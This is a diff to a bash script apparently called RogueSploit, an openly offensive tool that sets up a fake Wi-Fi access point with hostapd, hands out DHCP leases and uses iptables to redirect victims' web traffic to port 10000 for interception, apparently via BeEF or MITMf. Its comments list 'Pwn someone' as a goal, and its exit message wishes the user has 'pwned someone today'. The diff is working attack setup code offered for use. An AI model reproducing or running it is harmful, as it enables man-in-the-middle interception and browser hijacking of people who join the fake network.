@@ -9,8 +9,9 @@
 # - Add Mitmf;[DONE]                                                                                         #
 # - Add BDFProxy;                                                                                            #
 # - Add SeToolkit;                                                                                           #
-# - Use hostapd for fakeap                                                                                   #
+# - Use hostapd for fakeap; [DONE]                                                                           #
 # - Pwn someone                                                                                              #
+# - Add notification to update on startup; [DONE]                                                            #
 ##############################################################################################################
 
 
@@ -104,7 +105,7 @@ EOF
 
 relase_rules () {
 	pkill dhcpd
-	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+	ifconfig wlan1 up 10.0.0.1 netmask 255.255.255.0
 	iptables -F
 	iptables -t nat -F
 	iptables -t mangle -F
@@ -112,7 +113,7 @@ relase_rules () {
 	iptables -A FORWARD -i wlan1 -j ACCEPT
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 	touch /var/lib/dhcp/dhcpd.leases
-	dhcpd -cf dhcpd.conf at0
+	dhcpd -cf dhcpd.conf wlan1
 }
 #AutoPWN 1
 autopwning1 () {
@@ -957,7 +958,9 @@ if test $answer1 == '1'
 	pkill airbase-ng
 	pkill airmon-ng
 	pkill dhcpd
-	nameap=$(zenity --entry --title="Fake AP" --text="Input the name you want to use for the Access Point");tput sgr0
+	pkill hostapd
+	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]";tput sgr0
+	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
 	echo -e $red"[!] $myname YOU NEED WLAN1 INTERFACE FOR THESE [!]"
@@ -965,12 +968,11 @@ if test $answer1 == '1'
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
 	service network-manager stop
-	echo "
-interface=wlan1
+	echo "interface=wlan1
 driver=nl80211
 ssid=$nameap
-channel=6
-hw_mode=g " > $PWD/hostapd.conf
+channel=6 "> $PWD/hostapd.conf
+	pkill hostapd
 	rogueon && xterm -title "BeEF" -bg "#000000" -fg "#ffff00" -geometry 100x25-1-1 -e "hostapd hostapd.conf"
 	service network-manager start
 	menu
@@ -1011,7 +1013,6 @@ elif test $answer1 == '2'
 			pkill dhcpd
 			pkill airmon-ng
 			pkill airbase-ng
-			ifconfig at0 down
 			sleep 1
 			echo -e $yellow"--<[*] Hope you pwned someone today $myname! [*]>--"
 			echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
@@ -1041,9 +1042,10 @@ elif test $answer1 == '4'
 	clear
 	pkill dnsmasq
 	pkill dhcpd
+	pkill hostapd
 	pkill airmon-ng
 	pkill airbase-ng
-	ifconfig at0 down
+	service network-manager restart
 	echo -e $red"Goodbye $myname.."
 	sleep 2
 	clear
@@ -1162,20 +1164,21 @@ if test $answer1 == '1'
 	pkill airbase-ng
 	pkill airmon-ng
 	pkill dhcpd
-	nameap=$(zenity --entry --title="Fake AP" --text="Input the name you want to use for the Access Point");tput sgr0
+	pkill hostapd
+	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]";tput sgr0
+	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
 	echo -e $red"[!] $myname YOU NEED WLAN1 INTERFACE FOR THESE [!]"
 	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
-	service network-manager
-	echo "
-interface=wlan1
+	service network-manager stop
+	echo "interface=wlan1
 driver=nl80211
 ssid=$nameap
-channel=6
-hw_mode=g " > $PWD/hostapd.conf
+channel=6 "> $PWD/hostapd.conf
+	pkill hostapd
 	rogueon && xterm -title "BeEF" -bg "#000000" -fg "#ffff00" -geometry 100x25-1-1 -e "hostapd hostapd.conf"
 	service network-manager start
 	menu
@@ -1216,7 +1219,6 @@ elif test $answer1 == '2'
 			pkill dhcpd
 			pkill airmon-ng
 			pkill airbase-ng
-			ifconfig at0 down
 			sleep 1
 			echo -e $yellow"--<[*] Hope you pwned someone today $myname! [*]>--"
 			echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
@@ -1246,9 +1248,10 @@ elif test $answer1 == '4'
 	clear
 	pkill dnsmasq
 	pkill dhcpd
+	pkill hostapd
 	pkill airmon-ng
 	pkill airbase-ng
-	ifconfig at0 down
+	service network-manager restart
 	echo -e $red"Goodbye $myname.."
 	sleep 2
 	clear
